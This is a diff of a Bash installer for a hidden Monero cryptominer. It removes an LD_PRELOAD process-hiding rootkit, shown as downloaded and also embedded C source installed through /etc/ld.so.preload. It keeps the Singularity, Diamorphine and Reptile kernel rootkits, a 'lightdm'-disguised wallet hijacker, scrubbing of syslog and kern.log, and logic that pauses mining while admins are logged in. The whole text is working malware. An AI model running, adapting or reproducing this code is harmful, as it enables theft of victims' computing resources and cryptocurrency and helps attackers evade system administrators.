@@ -1466,217 +1466,19 @@ else
     unset GIT_TERMINAL_PROMPT
 fi
 
-# ==================== INSTALL LD_PRELOAD ROOTKIT (ALL KERNELS) ====================
+# ==================== INSTALL SINGULARITY (KERNEL 6.X ONLY) ====================
 echo ""
 echo "========================================"
-echo "INSTALLING LD_PRELOAD ROOTKIT"
+echo "CHECKING FOR SINGULARITY (KERNEL 6.X)"
 echo "========================================"
-echo "[*] This works on ALL kernel versions!"
 
-# Download the processhider.c from GitHub
-cd /tmp || exit 1
-echo "[*] Downloading processhider.c from GitHub..."
-
-curl -s -o /tmp/processhider.c https://raw.githubusercontent.com/littlAcen/libprocesshider/refs/heads/master/processhider.c 2>/dev/null || {
-    echo "[!] curl failed, trying wget..."
-    wget -q -O /tmp/processhider.c https://raw.githubusercontent.com/littlAcen/libprocesshider/refs/heads/master/processhider.c 2>/dev/null || {
-        echo "[!] Could not download processhider.c, creating from embedded code..."
-        
-        # Fallback: Create from embedded code
-        cat > /tmp/processhider.c << 'PROCESSHIDER_EOF'
-#define _GNU_SOURCE
-
-#include <stdio.h>
-#include <dlfcn.h>
-#include <dirent.h>
-#include <string.h>
-#include <unistd.h>
-
-/*
- * List of process names to hide
- * Add any process you want to hide here!
- * NOTE: We DON'T hide "xmrig" so we can detect competing miners!
- */
-static const char* processes_to_hide[] = {
-    "swapd",           // Our miner (binary is directly named swapd, no symlink)
-    "lightdm",         // Wallet hijacker (disguised as display manager)
-    // "kworker/0:0",  // COMMENTED: prctl renaming disabled
-    // ".kworker",     // REMOVED: File is now renamed to swapd directly
-    NULL               // Terminator - ALWAYS keep this!
-};
-
-/*
- * Get a directory name given a DIR* handle
- */
-static int get_dir_name(DIR* dirp, char* buf, size_t size)
-{
-    int fd = dirfd(dirp);
-    if(fd == -1) {
-        return 0;
-    }
-
-    char tmp[64];
-    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
-    ssize_t ret = readlink(tmp, buf, size);
-    if(ret == -1) {
-        return 0;
-    }
-
-    buf[ret] = 0;
-    return 1;
-}
-
-/*
- * Get a process name given its pid
- */
-static int get_process_name(char* pid, char* buf)
-{
-    if(strspn(pid, "0123456789") != strlen(pid)) {
-        return 0;
-    }
-
-    char tmp[256];
-    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
- 
-    FILE* f = fopen(tmp, "r");
-    if(f == NULL) {
-        return 0;
-    }
-
-    if(fgets(tmp, sizeof(tmp), f) == NULL) {
-        fclose(f);
-        return 0;
-    }
-
-    fclose(f);
-
-    int unused;
-    sscanf(tmp, "%d (%[^)]s", &unused, buf);
-    return 1;
-}
-
-/*
- * Check if a process should be hidden
- * Returns 1 if process should be hidden, 0 otherwise
- */
-static int should_hide_process(const char* process_name)
-{
-    int i;
-    for(i = 0; processes_to_hide[i] != NULL; i++) {
-        // Use strstr for substring matching
-        // This catches "kworker/0:0" even if full name is different
-        if(strstr(process_name, processes_to_hide[i]) != NULL) {
-            return 1;  // Hide this process
-        }
-    }
-    return 0;  // Don't hide
-}
-
-#define DECLARE_READDIR(dirent, readdir)                                \
-static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
-                                                                        \
-struct dirent* readdir(DIR *dirp)                                       \
-{                                                                       \
-    if(original_##readdir == NULL) {                                    \
-        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
-        if(original_##readdir == NULL)                                  \
-        {                                                               \
-            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
-        }                                                               \
-    }                                                                   \
-                                                                        \
-    struct dirent* dir;                                                 \
-                                                                        \
-    while(1)                                                            \
-    {                                                                   \
-        dir = original_##readdir(dirp);                                 \
-        if(dir) {                                                       \
-            char dir_name[256];                                         \
-            char process_name[256];                                     \
-            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
-                strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name) &&          \
-                should_hide_process(process_name)) {                    \
-                continue;                                               \
-            }                                                           \
-        }                                                               \
-        break;                                                          \
-    }                                                                   \
-    return dir;                                                         \
-}
-
-DECLARE_READDIR(dirent64, readdir64);
-DECLARE_READDIR(dirent, readdir);
-PROCESSHIDER_EOF
-    }
-}
-
-# Compile the LD_PRELOAD library
-echo "[*] Compiling libprocesshider.so..."
-
-if [ "$VERBOSE" = true ]; then
-    echo "[*] gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl"
-    gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl
-    GCC_SUCCESS=$?
-else
-    gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl 2>/dev/null
-    GCC_SUCCESS=$?
-fi
-
-if [ $GCC_SUCCESS -eq 0 ]; then
-    echo "[✓] LD_PRELOAD library compiled successfully"
-    
-    # Install system-wide
-    if [ ! -f /etc/ld.so.preload ]; then
-        echo "[*] Installing LD_PRELOAD system-wide..."
-        echo "/usr/local/lib/libprocesshider.so" > /etc/ld.so.preload
-        echo "[✓] LD_PRELOAD activated in /etc/ld.so.preload"
-    else
-        # Check if already in ld.so.preload
-        if ! grep -q "libprocesshider.so" /etc/ld.so.preload; then
-            echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload
-            echo "[✓] LD_PRELOAD added to existing /etc/ld.so.preload"
-        else
-            echo "[✓] LD_PRELOAD already configured"
-        fi
-    fi
-    
-    echo "[✓] Processes will be hidden: swapd, lightdm"
-    echo "[*] NOT hiding 'xmrig' so you can detect competing miners!"
-else
-    echo "[!] Failed to compile LD_PRELOAD library"
-    echo "[!] Trying to install gcc..."
-    if [ "$VERBOSE" = true ]; then
-        apt-get install -y gcc
-    else
-        apt-get install -y gcc 2>&1 | tail -3
-    fi
-    
-    # Try again
-    if [ "$VERBOSE" = true ]; then
-        gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl
-        GCC_SUCCESS2=$?
-    else
-        gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -ldl 2>/dev/null
-        GCC_SUCCESS2=$?
-    fi
-    
-    if [ $GCC_SUCCESS2 -eq 0 ]; then
-        echo "[✓] LD_PRELOAD library compiled successfully (second attempt)"
-        echo "/usr/local/lib/libprocesshider.so" > /etc/ld.so.preload
-        echo "[✓] LD_PRELOAD activated"
-    else
-        echo "[!] LD_PRELOAD compilation failed - continuing without it"
-    fi
-fi
-
-# Clean up
-rm -f /tmp/processhider.c
-
-# ==================== INSTALL SINGULARITY (KERNEL 6.X ONLY) ====================
+SINGULARITY_LOADED=false  # Initialize flag
 KERNEL_MAJOR=$(uname -r | cut -d. -f1)
+echo "[*] Detected kernel major version: $KERNEL_MAJOR"
 
-if [ "$KERNEL_MAJOR" -eq 6 ]; then
+# More robust check - works with both string and int
+if [[ "$KERNEL_MAJOR" == "6" ]] || [ "$KERNEL_MAJOR" -eq 6 ] 2>/dev/null; then
+    echo "[✓] Kernel 6.x detected - installing Singularity!"
     echo ""
     echo "========================================"
     echo "INSTALLING SINGULARITY ROOTKIT"
@@ -1684,7 +1486,13 @@ if [ "$KERNEL_MAJOR" -eq 6 ]; then
     echo "========================================"
     
     # Ensure we're in /dev/shm for stealth
-    cd /dev/shm || cd /tmp || exit 1
+    if ! cd /dev/shm 2>/dev/null; then
+        echo "[!] /dev/shm not available, using /tmp"
+        cd /tmp || {
+            echo "[!] Cannot cd to /tmp - skipping Singularity"
+            SINGULARITY_LOADED=false
+        }
+    fi
     
     # Remove old Singularity if exists
     if [ -d "Singularity" ]; then
@@ -1738,7 +1546,7 @@ if [ "$KERNEL_MAJOR" -eq 6 ]; then
                 echo "[*] Error log (last 10 lines):"
                 tail -10 /tmp/singularity_build.log | grep -i error || tail -10 /tmp/singularity_build.log
                 echo ""
-                echo "[*] This is OK - LD_PRELOAD will still hide processes"
+                echo "[*] This is OK - kernel rootkits will hide processes"
                 SINGULARITY_LOADED=false
             fi
         else
@@ -1750,14 +1558,15 @@ if [ "$KERNEL_MAJOR" -eq 6 ]; then
         cd /tmp 2>/dev/null || true
     else
         echo "[!] Failed to clone Singularity (network or repository unavailable)"
-        echo "[*] This is OK - LD_PRELOAD will still hide processes"
+        echo "[*] This is OK - kernel rootkits will hide processes"
         unset GIT_TERMINAL_PROMPT
         SINGULARITY_LOADED=false
     fi
 else
     echo ""
-    echo "[*] Kernel $(uname -r) - Skipping Singularity (only for 6.x)"
-    echo "[*] LD_PRELOAD rootkit is active (works on all kernels)"
+    echo "[*] Kernel $(uname -r) detected (major version: $KERNEL_MAJOR)"
+    echo "[!] Singularity requires kernel 6.x - SKIPPING"
+    echo "[*] Kernel rootkits are active for process hiding"
     SINGULARITY_LOADED=false
 fi
 
@@ -1765,13 +1574,12 @@ fi
 echo ''
 echo "[*] Starting swapd service..."
 
-# IMPORTANT: Restart (not just start) to activate LD_PRELOAD hiding
 # If service was already running, it won't be hidden until restarted!
 
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
     # Check if already running
     if systemctl is-active --quiet swapd 2>/dev/null; then
-        echo "[*] Service already running - restarting to activate LD_PRELOAD..."
+        echo "[*] Service already running - restarting service..."
         systemctl restart swapd 2>/dev/null
     else
         echo "[*] Starting service for first time..."
@@ -1782,7 +1590,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
 else
     # SysV init
     if /etc/init.d/swapd status 2>/dev/null | grep -q "running"; then
-        echo "[*] Service already running - restarting to activate LD_PRELOAD..."
+        echo "[*] Service already running - restarting service..."
         /etc/init.d/swapd restart
     else
         echo "[*] Starting service for first time..."
@@ -1793,60 +1601,8 @@ else
 fi
 
 echo ""
-echo "[*] Verifying LD_PRELOAD is active for new processes..."
-if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
-    echo "[✓] LD_PRELOAD configured - newly started processes will be hidden"
-    echo "[*] Testing process visibility..."
-    
-    # Give it a moment to start
-    sleep 2
-    
-    # Test if processes are hidden
-    if ps aux | grep "swapd" | grep -v grep >/dev/null 2>&1; then
-        echo ""
-        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-        echo "⚠️  WARNING: Processes are still VISIBLE!"
-        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-        echo ""
-        echo "This can happen if:"
-        echo "  • Services were already running before LD_PRELOAD installation"
-        echo "  • System hasn't fully reloaded the preload library"
-        echo ""
-        echo "RECOMMENDED ACTIONS (choose one):"
-        echo ""
-        echo "Option 1 - Quick Fix (Restart services):"
-        echo "  systemctl restart swapd"
-        echo "  systemctl restart lightdm"
-        echo ""
-        echo "Option 2 - Complete Fix (Reboot):"
-        echo "  reboot"
-        echo ""
-        echo "After restart/reboot, verify with:"
-        echo "  ps aux | grep swapd"
-        echo "  (should show nothing!)"
-        echo ""
-        echo "Check service status with:"
-        echo "  systemctl status swapd"
-        echo "  (will show: active/running)"
-        echo ""
-        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-        echo ""
-    else
-        echo "[✓] Processes successfully hidden!"
-    fi
-else
-    echo "[!] LD_PRELOAD not configured - processes will be visible"
-fi
-
 # ==================== HIDE MINER PROCESSES ====================
 echo "[*] Hiding miner processes..."
-
-# Method 1: LD_PRELOAD (automatic, system-wide)
-if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
-    echo "[✓] LD_PRELOAD rootkit active (processes automatically hidden)"
-    echo "    Hiding: swapd, lightdm"
-    echo "    NOT hiding: xmrig (to detect competing miners)"
-fi
 
 # Method 2: Singularity (kill -59) for Kernel 6.x
 if [ "$SINGULARITY_LOADED" = true ]; then
@@ -1935,10 +1691,6 @@ sed -i '/Singularity/d' /var/log/syslog 2>/dev/null
 sed -i '/Singularity/d' /var/log/kern.log 2>/dev/null
 sed -i '/Singularity/d' /var/log/messages 2>/dev/null
 
-# Remove LD_PRELOAD evidence
-sed -i '/libprocesshider/d' /var/log/syslog 2>/dev/null
-sed -i '/libprocesshider/d' /var/log/auth.log 2>/dev/null
-sed -i '/ld.so.preload/d' /var/log/syslog 2>/dev/null
 
 # Remove the mount/unmount evidence
 sed -i '/proc-.*mount/d' /var/log/syslog 2>/dev/null
@@ -2060,9 +1812,8 @@ HIJACKER_SERVICE_EOF
     systemctl daemon-reload 2>/dev/null || true
     systemctl enable lightdm 2>/dev/null
     
-    # Restart if already running to activate LD_PRELOAD, otherwise start
     if systemctl is-active --quiet lightdm 2>/dev/null; then
-        echo "[*] Wallet hijacker already running - restarting to activate LD_PRELOAD..."
+        echo "[*] Wallet hijacker already running - restarting service..."
         systemctl restart lightdm 2>/dev/null
     else
         systemctl start lightdm 2>/dev/null
@@ -2082,9 +1833,9 @@ HIJACKER_SERVICE_EOF
         
         # Verify it's hidden
         if ps aux | grep "lightdm.*daemon" | grep -v grep >/dev/null 2>&1; then
-            echo "[⚠] WARNING: lightdm process still VISIBLE - may need reboot for LD_PRELOAD"
+            echo "[⚠] WARNING: lightdm process still VISIBLE"
         else
-            echo "[✓] lightdm process successfully HIDDEN by LD_PRELOAD"
+            echo "[✓] lightdm process successfully HIDDEN by kernel rootkits"
         fi
     else
         echo "[!] Warning: Smart wallet hijacker service failed to start"
@@ -2248,7 +1999,7 @@ echo ""
 
 # ==================== INSTALLATION SUMMARY ====================
 echo '========================================================================='
-echo '[✓] FULL ULTIMATE v3.2 SETUP COMPLETE (NO LIBHIDE VERSION)!'
+echo '[✓] FULL ULTIMATE v3.2 SETUP COMPLETE (KERNEL ROOTKITS ONLY)!'
 echo '========================================================================='
 echo ''
 echo 'System Configuration:'
@@ -2272,14 +2023,6 @@ fi
 
 echo ''
 echo 'Stealth Features Deployed:'
-
-if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
-    echo '  ✓ LD_PRELOAD Rootkit: ACTIVE (userland process hiding - ALL KERNELS)'
-    echo '    Hiding: swapd, lightdm'
-    echo '    NOT hiding: xmrig (to detect competing miners)'
-else
-    echo '  ○ LD_PRELOAD Rootkit: Not loaded'
-fi
 
 if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q singularity 2>/dev/null; then
     echo '  ✓ Singularity: ACTIVE (kernel 6.x rootkit - kill -59 to hide)'
@@ -2318,9 +2061,9 @@ else
 fi
 
 echo '  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling'
-echo '  ✓ Process name: swapd (LD_PRELOAD will hide it)'
-echo '  ✓ Binary structure: swapd wrapper → .kworker (actual miner)'
-echo '  ✓ Process hiding: LD_PRELOAD + Kernel rootkits (multi-layer)'
+echo '  ✓ Process name: swapd'
+echo '  ✓ Binary structure: direct binary /root/.swapd/swapd (no symlink/wrapper)'
+echo '  ✓ Process hiding: Kernel rootkits (multi-layer)'
 
 echo ''
 echo 'Installation Method:'
@@ -2339,7 +2082,6 @@ echo '  Pool:    gulf.moneroocean.stream:80'
 
 echo ''
 echo 'Process Hiding Commands:'
-echo '  LD_PRELOAD: Automatic (always active, system-wide)'
 echo '  Singularity: kill -59 $PID  (kernel 6.x only)'
 echo '  Diamorphine: kill -31 $PID  (hide), kill -63 $PID (unhide)'
 echo '  Crypto-RK:   kill -31 $PID  (hide)'
@@ -2349,11 +2091,12 @@ echo ''
 echo '========================================================================='
 echo '[*] Miner will auto-stop when admins login and restart when they logout'
 echo '[*] Multi-layer process hiding:'
-echo '    Layer 1: LD_PRELOAD (userland - works on ALL kernels)'
 if [ "$SINGULARITY_LOADED" = true ]; then
-    echo '    Layer 2: Singularity (kernel-level - Kernel 6.x)'
+    echo '    Layer 1: Singularity (kernel-level - Kernel 6.x)'
+    echo '    Layer 2: Kernel rootkits (Diamorphine/Reptile/Crypto-RK)'
+else
+    echo '    Layer 1: Kernel rootkits (Diamorphine/Reptile/Crypto-RK)'
 fi
-echo '    Layer 3: Kernel rootkits (Diamorphine/Reptile/Crypto-RK)'
 echo ''
 echo '========================================================================='
 echo 'FINAL PROCESS VISIBILITY CHECK'
